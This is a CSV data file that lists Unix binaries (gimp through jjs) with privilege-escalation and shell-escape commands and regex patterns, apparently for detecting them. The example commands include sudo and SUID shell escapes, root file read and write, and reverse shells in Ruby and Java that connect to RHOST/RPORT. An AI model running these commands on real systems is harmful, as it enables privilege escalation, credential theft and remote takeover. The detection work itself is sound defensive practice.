"Name","Function","ExampleCode","RegexStrictV8","Notes"
"gimp","file-write","gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'","(?i)\b(?:\S*/)?gimp\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"gimp","file-read","gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'","(?i)\b(?:\S*/)?gimp\b.*print\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"gimp","library-load","gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","(?i)\b(?:\S*/)?gimp\b.*LoadLibrary\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"gimp","suid","./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","(?i)\b(?:\S*/)?gimp\b.*execl\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh",""
"gimp","sudo","sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)\b(?:\S*/)?sudo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\)",""
"ginsh","shell","ginsh
!/bin/sh","(?i)\b(?:\S*/)?ginsh\b.*/bin/sh",""
"ginsh","limited-suid","./ginsh
!/bin/sh","(?i)\b(?:\S*/)?ginsh\b.*/bin/sh",""
"ginsh","sudo","sudo ginsh
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"git","shell","PAGER='sh -c ""exec sh 0<&1""' git -p help","(?i)\b(?:\S*/)?PAGER\b.*\-c",""
"git","shell","git help config
!/bin/sh","(?i)\b(?:\S*/)?git\b.*/bin/sh",""
"git","shell","git branch --help config
!/bin/sh","(?i)\b(?:\S*/)?git\b.*/bin/sh",""
"git","shell","git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x","(?i)\b(?:\S*/)?git\b.*/bin/sh.*\-c",""
"git","shell","ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x","(?i)\b(?:\S*/)?ln\b.*/bin/sh",""
"git","file-read","git diff /dev/null $LFILE","(?i)\b(?:\S*/)?git\b.*.+",""
"git","file-write","git apply --unsafe-paths --directory / x.patch","(?i)\b(?:\S*/)?git\b.*.+",""
"git","sudo","sudo PAGER='sh -c ""exec sh 0<&1""' git -p help","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"git","sudo","sudo git -p help config
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"git","sudo","sudo git branch --help config
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"git","sudo","git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x","(?i)\b(?:\S*/)?git\b.*/bin/sh.*\-c",""
"git","sudo","ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x","(?i)\b(?:\S*/)?ln\b.*/bin/sh",""
"git","limited-suid","PAGER='sh -c ""exec sh 0<&1""' ./git -p help","(?i)\b(?:\S*/)?PAGER\b.*\-c",""
"grc","shell","grc --pty /bin/sh","(?i)\b(?:\S*/)?grc\b.*/bin/sh",""
"grc","sudo","sudo grc --pty /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"grep","file-read","grep '' $LFILE","(?i)\b(?:\S*/)?grep\b.*(?:""[^""]+""|\'[^\']+\')",""
"grep","suid","./grep '' $LFILE","(?i)\b(?:\S*/)?grep\b.*(?:""[^""]+""|\'[^\']+\')",""
"grep","sudo","sudo grep '' $LFILE","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"gtester","file-write","gtester ""DATA"" -o $LFILE","(?i)\b(?:\S*/)?gtester\b.*(?:""[^""]+""|\'[^\']+\')",""
"gtester","shell","echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"gtester","sudo","echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"gtester","suid","echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"gzip","file-read","gzip -f $LFILE -t","(?i)\b(?:\S*/)?gzip\b.*.+",""
"gzip","file-read","gzip -c $LFILE | gzip -d","(?i)\b(?:\S*/)?gzip\b.*\-c",""
"gzip","suid","./gzip -f $LFILE -t","(?i)\b(?:\S*/)?gzip\b.*.+",""
"gzip","sudo","sudo gzip -f $LFILE -t","(?i)\b(?:\S*/)?sudo\b.*.+",""
"hd","file-read","hd ""$LFILE""","(?i)\b(?:\S*/)?hd\b.*(?:""[^""]+""|\'[^\']+\')",""
"hd","suid","./hd ""$LFILE""","(?i)\b(?:\S*/)?hd\b.*(?:""[^""]+""|\'[^\']+\')",""
"hd","sudo","sudo hd ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"head","file-read","head -c1G ""$LFILE""","(?i)\b(?:\S*/)?head\b.*\-c",""
"head","suid","./head -c1G ""$LFILE""","(?i)\b(?:\S*/)?head\b.*\-c",""
"head","sudo","sudo head -c1G ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"hexdump","file-read","hexdump -C ""$LFILE""","(?i)\b(?:\S*/)?hexdump\b.*\-c",""
"hexdump","suid","./hexdump -C ""$LFILE""","(?i)\b(?:\S*/)?hexdump\b.*\-c",""
"hexdump","sudo","sudo hexdump -C ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"highlight","file-read","highlight --no-doc --failsafe ""$LFILE""","(?i)\b(?:\S*/)?highlight\b.*(?:""[^""]+""|\'[^\']+\')",""
"highlight","suid","./highlight --no-doc --failsafe ""$LFILE""","(?i)\b(?:\S*/)?highlight\b.*(?:""[^""]+""|\'[^\']+\')",""
"highlight","sudo","sudo highlight --no-doc --failsafe ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"hping3","shell","hping3
/bin/sh","(?i)\b(?:\S*/)?hping3\b.*/bin/sh",""
"hping3","suid","./hping3
/bin/sh -p","(?i)\b(?:\S*/)?hping3\b.*/bin/sh",""
"hping3","sudo","sudo hping3
/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"hping3","sudo","sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"iconv","file-write","echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"iconv","file-read","iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)\b(?:\S*/)?iconv\b.*(?:""[^""]+""|\'[^\']+\')",""
"iconv","suid","./iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)\b(?:\S*/)?iconv\b.*(?:""[^""]+""|\'[^\']+\')",""
"iconv","sudo","./iconv -f 8859_1 -t 8859_1 ""$LFILE""","(?i)\b(?:\S*/)?iconv\b.*(?:""[^""]+""|\'[^\']+\')",""
"iftop","shell","iftop
!/bin/sh","(?i)\b(?:\S*/)?iftop\b.*/bin/sh",""
"iftop","limited-suid","./iftop
!/bin/sh","(?i)\b(?:\S*/)?iftop\b.*/bin/sh",""
"iftop","sudo","sudo iftop
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"install","suid","./install -m 6777 $LFILE $TF","(?i)\b(?:\S*/)?install\b.*.+",""
"install","sudo","sudo install -m 6777 $LFILE $TF","(?i)\b(?:\S*/)?sudo\b.*.+",""
"ionice","shell","ionice /bin/sh","(?i)\b(?:\S*/)?ionice\b.*/bin/sh",""
"ionice","suid","./ionice /bin/sh -p","(?i)\b(?:\S*/)?ionice\b.*/bin/sh",""
"ionice","sudo","sudo ionice /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"ip","file-read","ip -force -batch ""$LFILE""","(?i)\b(?:\S*/)?ip\b.*(?:""[^""]+""|\'[^\']+\')",""
"ip","suid","./ip -force -batch ""$LFILE""","(?i)\b(?:\S*/)?ip\b.*(?:""[^""]+""|\'[^\']+\')",""
"ip","suid","./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo","(?i)\b(?:\S*/)?ip\b.*/bin/sh",""
"ip","sudo","sudo ip -force -batch ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"ip","sudo","sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"ip","sudo","sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"irb","shell","irb
exec '/bin/bash'","(?i)\b(?:\S*/)?irb\b.*/bin/bash",""
"irb","reverse-shell","irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","(?i)\b(?:\S*/)?irb\b.*new\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*popen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\)",""
"irb","file-upload","irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;","(?i)\b(?:\S*/)?irb\b.*new\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"irb","file-download","irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])","(?i)\b(?:\S*/)?irb\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*copy_stream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"irb","file-write","irb
File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }","(?i)\b(?:\S*/)?irb\b.*open\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*write\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"irb","file-read","irb
puts File.read(""file_to_read"")","(?i)\b(?:\S*/)?irb\b.*read\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"irb","library-load","irb
require ""fiddle""; Fiddle.dlopen(""lib.so"")","(?i)\b(?:\S*/)?irb\b.*dlopen\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\)",""
"irb","sudo","sudo irb
exec '/bin/bash'","(?i)\b(?:\S*/)?sudo\b.*/bin/bash",""
"ispell","shell","ispell /etc/passwd
!/bin/sh","(?i)\b(?:\S*/)?ispell\b.*/bin/sh",""
"ispell","suid","./ispell /etc/passwd
!/bin/sh -p","(?i)\b(?:\S*/)?ispell\b.*/bin/sh",""
"ispell","sudo","sudo ispell /etc/passwd
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"jjs","shell","echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getRuntime\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*exec\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*waitFor\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/bin/sh.*\-c",""
"jjs","reverse-shell","echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");
var port=Java.type(""java.lang.System"").getenv(""RPORT"");
var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");
var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var Socket = Java.type(""java.net.Socket"");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs","(?i)\b(?:\S*/)?echo\b.*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*))\s*\).*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*))\s*\).*type\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*ProcessBuilder\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*redirectErrorStream\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*start\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close.*/bin/bash",""
